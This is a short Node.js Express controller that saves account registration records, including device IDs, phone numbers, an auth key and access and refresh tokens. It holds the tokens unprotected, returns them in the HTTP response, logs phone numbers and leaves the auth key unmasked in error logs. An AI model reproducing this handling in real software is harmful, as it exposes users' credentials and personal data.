//src/controllers/registerController.js
const RegisterHistory = require('../models/RegisterHistory');
const logger = require('../utils/logger');

exports.recordRegister = async (req, res) => {
    try {
        const {
            mid,
            nameLinee, 
            deviceId,
            authKey,
            phoneNumber,
            fileNumber,
            accessToken,
            refreshToken
        } = req.body;

        const registerRecord = new RegisterHistory({
            mid,
            displayName: nameLinee,
            deviceId,
            authKey, 
            phoneNumber,
            fileNumber,
            accessToken,
            refreshToken,
            registerDate: new Date()
        });

        await registerRecord.save();

        logger.info(`Registration recorded for user: ${mid}`, {
            displayName: nameLinee,
            deviceId,
            phoneNumber 
        });

        res.status(201).json(registerRecord);

    } catch (error) {
        logger.error('Record registration error', {
            error: error.message,
            data: {
                ...req.body,
                accessToken: '***',
                refreshToken: '***'
            }
        });
        res.status(500).json({ message: error.message });
    }
};